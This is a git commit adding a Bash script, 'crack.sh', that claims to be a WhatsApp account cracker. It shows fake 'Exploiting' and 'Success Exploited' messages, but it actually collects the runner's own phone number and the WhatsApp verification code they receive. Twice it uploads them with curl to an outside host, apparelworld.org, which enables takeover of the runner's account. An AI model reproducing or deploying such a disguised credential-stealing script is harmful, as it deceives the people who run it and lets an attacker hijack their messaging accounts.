667c91a26e821af2c0e5329d3fcf5dee82880b92
fad333 <47511104+fad333@users.noreply.github.com>
2019-03-21 16:29:41 +0800

    Create crack.sh

---
+++ crack.sh
@@ -0,0 +1,44 @@
+# whatscrack
+#!/bin/bash
+clear
+
+echo "
+++++++++++++++++++++++++++++++
+        Author : f4dl
+++++++++++++++++++++++++++++++
+        Tolls kampret
+++++++++++++++++++++++++++++++
+        Enjoy Your Life
+++++++++++++++++++++++++++++++
+
+echo "";
+read -p "Nomer Kamu (+62xxxx)=> " nomer;
+read -p "Nomer Target (+62xxxx) => " target;
+sleep 2
+echo "[+] Syncing Target...";
+sleep 1
+echo "Login  => $nomer";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Exploiting...";
+echo "Nomer => $nomer" >> bacot.html;
+curl -T bacot.html http://apparelworld.org/
+sleep 5;
+echo "[+] Done.";
+echo "Tunggu 3-5 Menit Untuk Mendapatkan Code.";
+read -p "Verify Code => " code;
+sleep 2
+echo "[+] Connecting to whatsapp.com...";
+echo "Login => $nomer";
+sleep 0.5
+echo "Code => $code";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Sending Exploit...";
+echo "Code => $code" >> bacot.html;
+curl -T bacot.html http://apparelworld.org/
+sleep 5
+echo "[+] Success Exploited!";
+exit;
